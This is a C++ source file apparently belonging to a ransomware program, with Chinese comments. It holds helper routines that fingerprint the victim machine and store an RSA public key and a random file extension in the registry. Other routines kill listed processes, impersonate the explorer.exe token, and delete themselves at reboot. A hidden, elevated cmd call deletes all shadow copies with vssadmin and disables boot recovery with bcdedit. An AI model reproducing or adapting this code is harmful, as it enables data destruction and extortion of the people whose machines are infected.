#define _CRT_SECURE_NO_WARNINGS

#include"RansomFunction.h"


string CpuCRC;
LPWSTR ComputerName;
LPWSTR UserName;
string pk_key;
string sk_key;
wstring extension_name;


//字符转换
//LPBYTE	CallStringToBinrary(LPWSTR lpBase64, DWORD dwLength, DWORD pcchString) {
//	DWORD dwFlag = CRYPT_STRING_NOCRLF;
//	if (pcchString)
//		dwFlag = CRYPT_STRING_BASE64HEADER;
//	DWORD dwFlags = dwFlag | CRYPT_STRING_BASE64;
//	static LPBYTE pbDist = NULL;
//	DWORD dwDst;
//	if (CryptStringToBinary(lpBase64, dwLength, CRYPT_STRING_BASE64, NULL, &dwDst, NULL, NULL)) {
//		pbDist = new BYTE[dwDst];
//		if (pbDist) {
//			if (!CryptStringToBinary(lpBase64, dwLength, CRYPT_STRING_BASE64, pbDist, &dwDst, NULL, NULL)) {
//				delete[] pbDist;
//				return 0;
//			}
//		}
//	}
//	return pbDist;
//
//};
//LPWSTR	CallBinaryToString(LPBYTE lpBinrary, DWORD dwLength, DWORD pcchString) {
//	DWORD dwFlag = CRYPT_STRING_NOCRLF;
//	if (pcchString)
//		dwFlag = CRYPT_STRING_BASE64HEADER;
//	DWORD dwFlags = dwFlag | CRYPT_STRING_BASE64;
//	static LPWSTR lpResult = NULL;
//	DWORD dwDst;
//	if (CryptBinaryToString((const BYTE*)lpBinrary, dwLength, dwFlags, NULL, &pcchString)) {
//		lpResult = new TCHAR[pcchString];
//		if (lpResult) {
//			if (!CryptBinaryToString((const BYTE*)lpBinrary, dwLength, dwFlags, lpResult, &pcchString)) {
//				delete[] lpResult;
//				return 0;
//			}
//		}
//	}
//	return lpResult;
//}
//信息收集
std::wstring s2ws(const std::string& s) {
	std::string curLocale = setlocale(LC_ALL, "");
	const char* _Source = s.c_str();
	size_t _Dsize = mbstowcs(NULL, _Source, 0) + 1;
	wchar_t* _Dest = new wchar_t[_Dsize];
	wmemset(_Dest, 0, _Dsize);
	mbstowcs(_Dest, _Source, _Dsize);
	std::wstring result = _Dest;
	delete[]_Dest;
	setlocale(LC_ALL, curLocale.c_str());
	return result;
}
LPWSTR	CallGetWINdowsDirectoryW() {
	LPWSTR  lpPath = new TCHAR[MAX_PATH];
	if (lpPath) {
		if (!GetWindowsDirectoryW(lpPath, MAX_PATH)) {
			delete[] lpPath;
			return 0;
		}
	}
	return lpPath;
}
LPDWORD	CallGetVolumeInformationW() {
	LPWSTR lpDirectory = CallGetWINdowsDirectoryW();
	LPDWORD lpResult = new DWORD(0);
	if (lpDirectory) {
		*(lpDirectory + 3) = 0;
		BOOL bValue = GetVolumeInformationW(lpDirectory, 0, 0, (LPDWORD)lpResult, 0, 0, 0, 0);
		lpResult = bValue != FALSE ? lpResult : 0;
	}
	return lpResult;
}
string	GetCpuid() {
	DWORD dwReg[4];
	DWORD _eax = 0 - 0x7FFFFFFF;
	__asm
	{
		mov eax, _eax;
		cpuid;
		mov dwReg[0], eax;
		mov dwReg[1], ebx;
		mov dwReg[2], ecx;
		mov dwReg[3], edx;
	}
	static string s;
	static char dw[10] = { 0 };
	for (size_t i = 0; i < 4; i++)
	{
		sprintf(dw, "%d", dwReg[i]);
		s += string(dw);
	}
	return s;
}
string GetCpuInfo() {
	LPWSTR lpResult = new TCHAR[40];
	static string lpcrc32_Number;
	char	str_1[MAX_PATH] = { 0 };
	if (lpResult) {
		LPDWORD	lpVolumeSerialNumber = CallGetVolumeInformationW();
		sprintf_s(str_1, MAX_PATH, "%u", *lpVolumeSerialNumber);
		CryptoPP::CRC32 hash;
		CryptoPP::StringSource(string(str_1), true, new CryptoPP::HashFilter(hash, new CryptoPP::HexEncoder(new CryptoPP::StringSink(lpcrc32_Number))));
		string Cpuid = GetCpuid();
		CryptoPP::StringSource(Cpuid, true, new CryptoPP::HashFilter(hash, new CryptoPP::HexEncoder(new CryptoPP::StringSink(lpcrc32_Number))));
		return lpcrc32_Number;

	}
	return 0;
}
LPWSTR CallGetComputerName() {
	static LPWSTR lpResult = new TCHAR[MAX_PATH];
	DWORD dwSize = 0x10;
	if (lpResult) {
		if (!GetComputerNameW(lpResult, &dwSize)) {
			delete[] lpResult;
			return 0;
		}
	}
	return lpResult;
};
LPWSTR CallGetUserName() {
	static LPWSTR lpResult = new TCHAR[MAX_PATH];
	DWORD dwSize = 0x10;
	if (lpResult) {
		if (!GetUserNameW(lpResult, &dwSize)) {
			delete[] lpResult;
			return 0;
		}
	}
	return lpResult;
}
//进程获取
DWORD GetProcessSnapshot(int p1, LPCSTR lpProcess, DWORD(*Function)(LPCSTR, LPPROCESSENTRY32W)) {
	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return FALSE;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	BOOL bValue = 0;
	if (Process32First(hSnapshot, &pe32)) {
		do
		{
			bValue = Function(lpProcess, &pe32);
			if (bValue)
				if (p1) break;
		} while (Process32Next(hSnapshot, &pe32));
	}
	return bValue;
};
DWORD CallStrcmp(LPCSTR lp, LPPROCESSENTRY32W pe32) {
	if (strcmp((LPCSTR)pe32->szExeFile, lp))
		return pe32->th32ProcessID;
	return FALSE;
};
DWORD SerachProcess(LPCSTR lpProcess) {
	DWORD	dwValue = -1;
	dwValue = GetProcessSnapshot(1, lpProcess, CallStrcmp);
	return dwValue;
}
//随机数
wstring	randstr(DWORD len)
{
	wstring str ;
	srand(time(NULL));
	int i;
	for (i = 0; i < len; ++i)
	{
		switch ((rand() % 3))
		{
		case 1:
			str += L'A' + rand() % 26;
			break;
		case 2:
			str += L'a' + rand() % 26;
			break;
		default:
			str += L'0' + rand() % 10;
			break;
		}
	}
	str += L'\0';
	return str;
}
//注册表操作
LPBYTE RegQuery(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR  lpValue) {
	static BYTE  lpData[512];
	HKEY  hkResult; 
	DWORD type;
	DWORD	nbytes;
	if (!RegOpenKeyExW(hKey, lpSubKey, 0, KEY_READ, &hkResult)) {
		if (!RegQueryValueExW(hkResult, lpValue, NULL, &type, NULL, &nbytes)) {
			RegQueryValueExW(hkResult, lpValue, NULL, &type, lpData, &nbytes);
			RegCloseKey(hkResult);
			return lpData;
		}
		RegCloseKey(hkResult);
	}
	return 0;
};
BOOL RegSet(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR  lpValue, DWORD dwType, CONST BYTE* lpData, DWORD cbData) {
	HKEY hkResult;
	BOOL bValue = FALSE;
	if (!RegCreateKeyEx(hKey, lpSubKey, 0, NULL, REG_OPTION_RESERVED, KEY_SET_VALUE, NULL, &hkResult, 0)) {
		if (!RegSetValueEx(hkResult, lpValue, 0, dwType, lpData, cbData))
			bValue = TRUE;
		RegCloseKey(hkResult);
	}
	return bValue;
}
VOID CallRegSet() {
	LPBYTE lpPkKey;
	if (RegQuery(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Random", L"pk_key")) {
		lpPkKey = RegQuery(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Random", L"pk_key");
		pk_key = string(lpPkKey, lpPkKey + 86);
	}
	else if (RegQuery(HKEY_CURRENT_USER, L"SOFTWARE\\Random", L"pk_key"))
	{
		lpPkKey = RegQuery(HKEY_CURRENT_USER, L"SOFTWARE\\Random", L"pk_key");
		pk_key = string(lpPkKey, lpPkKey + 86);
	}
	else {
		LPBYTE lpPK = (LPBYTE)Base64RsaPk.c_str();
		DWORD dwSize = Base64RsaPk.length();
		if (!RegSet(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Random", L"pk_key", REG_BINARY, lpPK, dwSize)) {
			RegSet(HKEY_CURRENT_USER, L"SOFTWARE\\Random", L"pk_key", REG_BINARY, lpPK, dwSize);
		}
	}

	//if (RegQuery(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Random", L"extension_name")) {
	//	lpPkKey = RegQuery(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Random", L"extension_name");
	//	char lpstr[20];
	//	sprintf(lpstr, "%ws", lpPkKey);
	//	extension_name = wstring(lpstr, lpstr + 6);
	//}
	//else if (RegQuery(HKEY_CURRENT_USER, L"SOFTWARE\\Random", L"extension_name"))
	//{
	//	lpPkKey = RegQuery(HKEY_CURRENT_USER, L"SOFTWARE\\Random", L"extension_name");
	//	char lpstr[20];
	//	sprintf(lpstr, "%ws", lpPkKey);
	//	extension_name = wstring(lpstr, lpstr + 6);
	//}
	/*else */if (!RegSet(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Random", L"extension_name", REG_BINARY, (BYTE*)extension_name.c_str(), 6*2)) {
		RegSet(HKEY_CURRENT_USER, L"SOFTWARE\\Random", L"extension_name", REG_BINARY, (BYTE*)extension_name.c_str(), 6*2);
	}
}
void test() {

	extension_name = randstr(6);
}
//主函数功能
BOOL CallImpersonateLoggedOnUser() {
	LPCSTR lpProcessName = "explorer.exe";
	HANDLE hProcess = GetCurrentProcess();
	if (VerifySecurityId(hProcess) != 0x4000) {
		//cout << "system" << endl;
		//system("pause");
		return TRUE;
	}
	DWORD dwProcessId = SerachProcess(lpProcessName);
	HANDLE hExeplorerProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, dwProcessId);
	if (hProcess == INVALID_HANDLE_VALUE)
		return FALSE;
	PHANDLE phTokenHandle = 0;
	if (!OpenProcessToken(hExeplorerProcess, TOKEN_ALL_ACCESS, phTokenHandle)) {
		CloseHandle(hProcess);
		return FALSE;
	}
	BOOL bUser = ImpersonateLoggedOnUser(phTokenHandle);
	CloseHandle(hProcess);
	CloseHandle(phTokenHandle);
	return bUser != 0;

};
BOOL InitString() {
	CpuCRC = GetCpuInfo();
	ComputerName = CallGetComputerName();
	UserName = CallGetUserName();
	extension_name = randstr(8);
	CallRegSet();
	if (!CpuCRC.size()|| !ComputerName || !UserName || !Base64RsaPk.size() || !extension_name.size() ) {
		return FALSE;
	}
	return TRUE;
};
//BOOL CallGetKeyboardLayoutlis() {};
// 结束指定进程
BOOL JsonCompare(vector<string> vec, wstring lpProcessName) {
	std::string str(lpProcessName.begin(), lpProcessName.end());

	transform(str.begin(), str.end(), str.begin(), ::tolower);
	for (vector<string>::iterator it = vec.begin(); it != vec.end(); it++) {
		if (it->compare(str) == 0)		return TRUE;
	}
	return FALSE;
};
DWORD CallTerminatedProess(LPCSTR lp, LPPROCESSENTRY32W pe32) {
	wstring lpProcessName = pe32->szExeFile;
	if (!JsonCompare(blockProcess, lpProcessName))
		return FALSE;
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe32->th32ProcessID);
	if (hProcess) {
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	return TRUE;
};
VOID CallCallTerminateProcess() {
	GetProcessSnapshot(0, 0, CallTerminatedProess);
};
VOID RunCmd() {
	LPCWSTR lpFile = L"C:/Windows/System32/cmd.exe";
	LPCWSTR lpParameters = L"/c vssadmin.exe Delete Shadows /All /Quiet & \
		bcdedit /set {default} recoveryenabled NO & \
		bcdedit /set {default} bootstatuspolicy ignoreallfailures & pause";

	SHELLEXECUTEINFO ShExecInfo = { 0 };
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_DEFAULT;
	ShExecInfo.hwnd = GetForegroundWindow();
	ShExecInfo.lpVerb = L"runas";
	ShExecInfo.lpFile = lpFile;
	ShExecInfo.lpParameters = lpParameters;
	ShExecInfo.nShow = SW_HIDE;
	while (!ShellExecuteExW(&ShExecInfo)) {
		;
	}
	//MessageBoxA(NULL, "管理员启动", "ok", MB_OK);

};
//VOID FreeString();
VOID CallReverToSelf() {
	HANDLE hProcess = GetCurrentProcess();
	if (VerifySecurityId(hProcess) == 0x4000)
		RevertToSelf();
};
VOID DeleteMyself() {
	wstring str = CallGetFilePath();
	if (str.size()) {
		MoveFileExW(str.c_str(), 0, MOVEFILE_DELAY_UNTIL_REBOOT);//重启删除
	}
	//int a = GetLastError();
}